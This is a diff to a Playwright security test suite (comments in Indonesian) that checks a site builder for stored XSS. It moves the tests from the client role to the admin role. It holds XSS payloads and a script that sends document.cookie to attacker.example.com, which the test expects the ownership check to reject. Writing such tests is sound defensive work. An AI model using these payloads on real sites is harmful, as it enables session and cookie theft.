@@ -46,7 +46,7 @@ test.describe("A03 — Stored XSS payload isolation", () => {
         "4) DOM element text mengandung literal '<img' string (bukan rendered image tag)",
       ].join(" | "),
     );
-    const { accessToken } = await loginAs(context, "client");
+    const { accessToken } = await loginAs(context, "admin");
     const xssPayload = `<img src=x onerror="window.__xss_pwned=true">`;
     let siteId = null;
     try {
@@ -95,7 +95,7 @@ test.describe("A03 — Stored XSS payload isolation", () => {
       testInfo,
       "Create site + page dengan title = '<script>alert(1)</script>'. Publish. GET /public/sites/:id/pages/_home → response.title = payload as string (backend lossless). Kalau dashboard/renderer HTML render title, harus escape ke '&lt;script&gt;...' — verify via API response (JSON body) tidak eksekusi.",
     );
-    const { accessToken } = await loginAs(context, "client");
+    const { accessToken } = await loginAs(context, "admin");
     const xssTitle = `<script>alert("xss-test")</script>`;
     let siteId = null;
     try {
@@ -143,7 +143,7 @@ test.describe("A03 — Stored XSS payload isolation", () => {
       testInfo,
       "Create page dengan tree.blocks[0] = {type: 'Heading', props: {text: '<img src=x onerror=alert(1)>'}}. Publish. GET /public/*/pages/_home → tree.blocks[0].props.text = payload as string (lossless dalam JSON). Renderer wajib escape saat inject ke DOM.",
     );
-    const { accessToken } = await loginAs(context, "client");
+    const { accessToken } = await loginAs(context, "admin");
     const xssBlockText = `<img src=x onerror=window.__block_xss=true>`;
     let siteId = null;
     try {
@@ -223,19 +223,20 @@ test.describe("A03 — Stored XSS payload isolation", () => {
   }, testInfo) => {
     req(
       testInfo,
-      "Custom head_code sengaja unsanitized (fitur GTM/Meta Pixel di CLAUDE.md). BAHAYA kalau user LAIN bisa set field ini di site orang lain. Test: agent PATCH /sites/<client-site-id> {custom_head_code: '<script>...</script>'} → HARUS 403/404 (ownership check), TIDAK boleh 200 tersimpan.",
+      "Custom head_code sengaja unsanitized (fitur GTM/Meta Pixel di CLAUDE.md). BAHAYA kalau user LAIN bisa set field ini di site orang lain. Test: agent PATCH /sites/<site-id milik user lain> {custom_head_code: '<script>...</script>'} → HARUS 403/404 (ownership check), TIDAK boleh 200 tersimpan.",
     );
-    const { accessToken: clientToken } = await loginAs(context, "client");
+    // POST /sites is admin-only; an admin-owned site is still "someone else's" for the agent.
+    const { accessToken: ownerToken } = await loginAs(context, "admin");
     const { accessToken: agentToken } = await loginAs(context, "agent");
     let siteId = null;
     try {
-      const site = (await (await api("POST", clientToken, "/api/v1/sites", {
+      const site = (await (await api("POST", ownerToken, "/api/v1/sites", {
         name: "Head Code Owner Test",
         theme: {},
       })).json()).data;
       siteId = site.id;
 
-      // Agent coba inject head code ke site milik client
+      // Agent coba inject head code ke site milik orang lain
       const evil = `<script>fetch("https://attacker.example.com/steal?ck="+document.cookie)</script>`;
       const patchRes = await api("PATCH", agentToken, `/api/v1/sites/${siteId}`, {
         custom_head_code: evil,
@@ -246,7 +247,7 @@ test.describe("A03 — Stored XSS payload isolation", () => {
       expect(patchRes.status).not.toBe(200);
 
       // Verify site.custom_head_code TIDAK berubah dari sisi owner.
-      const verify = await api("GET", clientToken, `/api/v1/sites/${siteId}`);
+      const verify = await api("GET", ownerToken, `/api/v1/sites/${siteId}`);
       const verifyData = (await verify.json()).data;
       expect(verifyData.custom_head_code).not.toBe(evil);
       expect(verifyData.custom_head_code || "").not.toMatch(/attacker\.example\.com/);
@@ -257,7 +258,7 @@ test.describe("A03 — Stored XSS payload isolation", () => {
       );
     } finally {
       if (siteId) {
-        await api("DELETE", clientToken, `/api/v1/sites/${siteId}`).catch(() => {});
+        await api("DELETE", ownerToken, `/api/v1/sites/${siteId}`).catch(() => {});
       }
     }
   });
